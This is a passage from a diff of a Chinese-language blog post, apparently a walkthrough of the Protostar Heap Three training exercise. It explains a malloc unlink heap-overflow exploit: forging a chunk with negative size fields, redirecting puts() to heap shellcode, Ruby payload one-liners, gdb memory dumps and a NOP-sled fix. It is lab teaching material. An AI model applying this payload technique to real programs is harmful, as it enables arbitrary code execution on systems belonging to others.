+&lt;h2 id=&#34;creating-a-fake-chunk&#34;&gt;Creating a fake chunk&lt;/h2&gt;
+&lt;p&gt;首先 &lt;code&gt;strcpy()&lt;/code&gt; 不会检查字符数量，所以可以在堆上写多于 &lt;code&gt;malloc(32)&lt;/code&gt; 的字符&lt;/p&gt;
+&lt;p&gt;我们现在要创建一个这样的 chunk：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    chunk -&amp;gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+             | prev_size: no idea                                      |
+             +---------------------------------------------------------+
+             | size: no idea                                           |
+      mem -&amp;gt; +---------------------------------------------------------+
+             | fd: addr of puts() minus 0x12                           |
+             +---------------------------------------------------------+
+             | bk: addr of shellcode                                   |
+             +---------------------------------------------------------+
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而且我们必须要让 &lt;code&gt;unlink()&lt;/code&gt; 这个函数被执行&amp;hellip;这就出现了两个先决条件：&lt;/p&gt;
 &lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;size&lt;/code&gt; 大小大于 64 bytes
-不然会使用 &lt;code&gt;fastbin&lt;/code&gt; 而不是双向链表
-实现思路是让 &lt;code&gt;size&lt;/code&gt; 大于 64（废话&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;前一个 chunk 看起来已被 free
-不然就不会 &lt;code&gt;unlink()&lt;/code&gt; 函数连接来两个双向链表
-实现思路是让 &lt;code&gt;size&lt;/code&gt; 的最后一个比特为零&lt;/p&gt;
-&lt;/li&gt;
+&lt;li&gt;前一个 chunk 也得是被 free 了的&lt;/li&gt;
+&lt;li&gt;这个 chunk 和 前一个 chunk 的 &lt;code&gt;size&lt;/code&gt; 都得大于 64 bytes 不然就会使用 &lt;code&gt;fastbin&lt;/code&gt; 而不是双向链表&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;以上两点是 &lt;code&gt;unlink()&lt;/code&gt; 会被调用的先决条件
-具体实现，是&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;在 &lt;code&gt;size&lt;/code&gt; 写一个负值 &lt;code&gt;0xfffffffc&lt;/code&gt;，即 &lt;code&gt;-4&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;这个值在同时满足以上条件的同时，还有另一个特点，就是在计算下一个 chunk 时，使用的是 &lt;code&gt;chunk B + size&lt;/code&gt; 即 &lt;code&gt;P + (-4)&lt;/code&gt;，那么就是在 chunk B 开头向前 4 bytes 的位置（实际上这里是 chunk A 的范围）&lt;/p&gt;
-&lt;ol start=&#34;2&#34;&gt;
-&lt;li&gt;在 &lt;code&gt;prev_size&lt;/code&gt; 上写上 &lt;code&gt;0xfffffff8&lt;/code&gt;，即 &lt;code&gt;-8&lt;/code&gt;，&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;计算上一个 chunk 时 &lt;code&gt;chunk B - prev_size&lt;/code&gt; 即 &lt;code&gt;chunk B - (-8)&lt;/code&gt;，那么就是在 chunk B 开头向后 8 bytes 的位置，也就是 mem ，而这里就是我们可以通过指向 chunk B 的 mem 的第二个 &lt;code&gt;strcpy()&lt;/code&gt; 来写我们的 fake chunk 的位置&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;还记得 malloc 标记前一个 chunk 是否被 free 的方法是：看 &lt;code&gt;size&lt;/code&gt; 的最后一个比特是否被设为零，设为零即「前一个 chunk 已被 free」&lt;/p&gt;
+&lt;p&gt;所以我们需要伪造一个 chunk size&amp;hellip;需要大于 64 bytes 而且最后一个比特为零&amp;hellip;&lt;/p&gt;
+&lt;p&gt;这里有一个很聪明的做法&amp;hellip;可以用负数，比如 &lt;code&gt;0xfffffff8&lt;/code&gt; 即 &lt;code&gt;-8&lt;/code&gt;&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;而且这个 &lt;code&gt;-8&lt;/code&gt; 能导致一个很有趣的特性：&lt;/p&gt;
+&lt;p&gt;malloc 计算上一个 chunk 的位置的方式是：&lt;code&gt;P - prev_size&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;那么 &lt;code&gt;P - (-8)&lt;/code&gt; = &lt;code&gt;P + 8&lt;/code&gt;，就是说下一个 chunk 出现在了当前 chunk 的向后 8 bytes&amp;hellip;&lt;/p&gt;
+&lt;p&gt;同时我们也可以让 &lt;code&gt;prev_size&lt;/code&gt; 同理&amp;hellip;不过具体是多少其实并不太重要因为 &amp;hellip;姑且为了区分就设为 &lt;code&gt;0xfffffffc&lt;/code&gt; 也就是 &lt;code&gt;-4&lt;/code&gt; 好了&lt;/p&gt;
+&lt;p&gt;结果就是，我们不需要浪费堆上很多的地址，只要在很小的一段空间里就能伪造出 BK 和 FD&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/fakechunk.png&#34;
+	width=&#34;1730&#34;
+	height=&#34;882&#34;
+	srcset=&#34;/p/protostar_heap_3/fakechunk_hu5057ef92d007ec3763703f099de47c83_241847_480x0_resize_box_3.png 480w, /p/protostar_heap_3/fakechunk_hu5057ef92d007ec3763703f099de47c83_241847_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;fakechunk&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;196&#34;
+		data-flex-basis=&#34;470px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;free-a-fastbin&#34;&gt;Free a fastbin&lt;/h2&gt;
+&lt;p&gt;其实已经基本解完了&amp;hellip;但其实还有最后一个小问题&lt;/p&gt;
+&lt;p&gt;我们先用上一节的那张图片的思路来试一下吧（第三个参数完全不需要，所以随便写一个 ABCD 就行）&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@protostar:/tmp$ ruby -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;puts &amp;#34;\x68\x64\x88\x04\x08\xc3&amp;#34; + &amp;#34;A&amp;#34;*26 + &amp;#34;\xf8\xff\xff\xff&amp;#34; + &amp;#34;\xfc\xff\xff\xff&amp;#34;   &amp;#39;&lt;/span&gt; &amp;gt; A
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@protostar:/tmp$ ruby -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;puts &amp;#34;\xef\xbe\xad\xde&amp;#34;*2 + &amp;#34;\x1c\xb1\x04\x08&amp;#34; + &amp;#34;\x08\xc0\x04\x08&amp;#34;   &amp;#39;&lt;/span&gt; &amp;gt; B
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; r &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;cat /tmp/A&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;cat /tmp/B&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; ABCD
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;太长不看，直接进入正题，从 Heap Three 的三个 &lt;code&gt;free()&lt;/code&gt; 开始吧&lt;/p&gt;
+&lt;p&gt;设置四个断点，分别是第一个 &lt;code&gt;free()&lt;/code&gt; 前和每个 &lt;code&gt;free()&lt;/code&gt; 后&lt;/p&gt;
+&lt;p&gt;直接看结果的话&amp;hellip;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; r &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;cat /tmp/A&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;cat /tmp/B&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; ABCD
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Starting program: /opt/protostar/bin/heap3 &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;cat /tmp/A&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;cat /tmp/B&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; ABCD
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# free(c) 之前&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c000:	0x00000000	0x00000029	0x04886468	0x4141c308
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c010:	0x41414141	0x41414141	0x41414141	0x41414141
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c020:	0x41414141	0x41414141	0xfffffff8	0xfffffffc
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c030:	0xdeadbeef	0xdeadbeef	0x0804b11c	0x0804c008
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c050:	0x00000000	0x00000029	0x44434241	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c070:	0x00000000	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Breakpoint 1, 0x08048911 in main &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4, &lt;span class=&#34;nv&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff804&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at heap3/heap3.c:24
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;24	in heap3/heap3.c
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# free(c) 之后&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Continuing.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c000:	0x00000000	0x00000029	0x04886468	0x4141c308
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c010:	0x41414141	0x41414141	0x41414141	0x41414141
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c020:	0x41414141	0x41414141	0xfffffff8	0xfffffffc
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c030:	0xdeadbeef	0xdeadbeef	0x0804b11c	0x0804c008
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c050:	0x00000000	0x00000029	0x00000000	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c070:	0x00000000	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Breakpoint 2, main &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4, &lt;span class=&#34;nv&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff804&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at heap3/heap3.c:25
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;25	in heap3/heap3.c
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# free(b) 之后&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Continuing.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c000:	0x00000000	0x00000029	0x04886468	0x4141c308
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c010:	0x0804b11c	0x41414141	0x41414141	0x41414141
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c020:	0x41414141	0xfffffff4	0xfffffff8	0xfffffffc
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c030:	0xdeadbeef	0xfffffff5	0x0804b194	0x0804b194
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c050:	0x00000000	0x00000fb1	0x00000000	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c070:	0x00000000	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Breakpoint 3, main &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4, &lt;span class=&#34;nv&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff804&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at heap3/heap3.c:26
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;26	in heap3/heap3.c
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# free(a) 之后&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Continuing.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c000:	0x00000000	0x00000029	0x00000000	0x4141c308
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c010:	0x0804b11c	0x41414141	0x41414141	0x41414141
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c020:	0x41414141	0xfffffff4	0xfffffff8	0xfffffffc
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c030:	0xdeadbeef	0xfffffff5	0x0804b194	0x0804b194
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c050:	0x00000000	0x00000fb1	0x00000000	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c070:	0x00000000	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Breakpoint 4, main &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4, &lt;span class=&#34;nv&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff804&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at heap3/heap3.c:28
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;28	in heap3/heap3.c
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 出现了 Segmentation fault&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Continuing.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Program received signal SIGSEGV, Segmentation fault.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c000:	0x00000000	0x00000029	0x00000000	0x4141c308
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c010:	0x0804b11c	0x41414141	0x41414141	0x41414141
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c020:	0x41414141	0xfffffff4	0xfffffff8	0xfffffffc
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c030:	0xdeadbeef	0xfffffff5	0x0804b194	0x0804b194
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c050:	0x00000000	0x00000fb1	0x00000000	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c070:	0x00000000	0x00000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x0804c024 in ?? &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Continuing.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Program terminated with signal SIGSEGV, Segmentation fault.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;The program no longer exists.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x804c000:	Error &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; running hook_stop:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Cannot access memory at address 0x804c000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可能已经看出来了，对于 chunk A 和 chunk C，这两个 chunk 的 metadata 中的 &lt;code&gt;size&lt;/code&gt; 是 &lt;code&gt;0x29&lt;/code&gt;，即十进制 41（这里多出来的 1 就是用于标记前一个 chunk 是否被使用的 1 比特）&lt;/p&gt;
+&lt;p&gt;所以 &lt;code&gt;size&lt;/code&gt; 小于生成双向链表的 64 bytes&amp;hellip;于是用的是 &lt;code&gt;fastbin&lt;/code&gt; 数据结构&lt;/p&gt;
+&lt;p&gt;结果在 &lt;code&gt;free(c)&lt;/code&gt; 和 &lt;code&gt;free(a)&lt;/code&gt; 的时候，mem的位置直接被清零了（见 &lt;code&gt;0x804c008&lt;/code&gt; 和 &lt;code&gt;0x804c058&lt;/code&gt;）&lt;/p&gt;
+&lt;p&gt;结果 &lt;code&gt;0x804c008&lt;/code&gt; 处写的 shellcode 被清掉了..&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;另外，&lt;code&gt;0x804c010&lt;/code&gt; 也被写上了奇怪的东西&amp;hellip;也就是&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;而且在第四步还出现了 &lt;code&gt;addr of shellcode+0x8 = addr of puts()&lt;/code&gt;，也就是说这个 shellcode + &lt;code&gt;0x8&lt;/code&gt; 的位置会被 &lt;code&gt;unlink()&lt;/code&gt; 写上 &lt;code&gt;addr of puts()&lt;/code&gt;&amp;hellip;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;这时候就又要请出 NOP 了&amp;hellip;我们直接把 &lt;code&gt;0x804c008&lt;/code&gt; 到 &lt;code&gt;0x804c010&lt;/code&gt; 全写上 NOP 就好了&amp;hellip;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/nop.png&#34;
+	width=&#34;1504&#34;
+	height=&#34;316&#34;
+	srcset=&#34;/p/protostar_heap_3/nop_hu38fa74e4de6e6b5568a8adfa2db215b5_236731_480x0_resize_box_3.png 480w, /p/protostar_heap_3/nop_hu38fa74e4de6e6b5568a8adfa2db215b5_236731_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;nop&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;475&#34;
+		data-flex-basis=&#34;1142px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;那么重新画一下图，就是这样：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/true.png&#34;
+	width=&#34;1806&#34;
+	height=&#34;830&#34;
+	srcset=&#34;/p/protostar_heap_3/true_hue05f22c1f5f25cc8fb5039835853a76c_244669_480x0_resize_box_3.png 480w, /p/protostar_heap_3/true_hue05f22c1f5f25cc8fb5039835853a76c_244669_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;true&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;217&#34;
+		data-flex-basis=&#34;522px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;end&#34;&gt;End&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@protostar:/tmp$ ruby -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;puts &amp;#34;\x90&amp;#34;*12 + &amp;#34;\x68\x64\x88\x04\x08\xc3&amp;#34; + &amp;#34;A&amp;#34;*14 + &amp;#34;\xf8\xff\xff\xff&amp;#34; + &amp;#34;\xfc\xff\xff\xff&amp;#34;   &amp;#39;&lt;/span&gt; &amp;gt; A
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@protostar:/tmp$ ruby -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;puts &amp;#34;\xef\xbe\xad\xde&amp;#34;*2 + &amp;#34;\x1c\xb1\x04\x08&amp;#34; + &amp;#34;\x08\xc0\x04\x08&amp;#34;   &amp;#39;&lt;/span&gt; &amp;gt; B
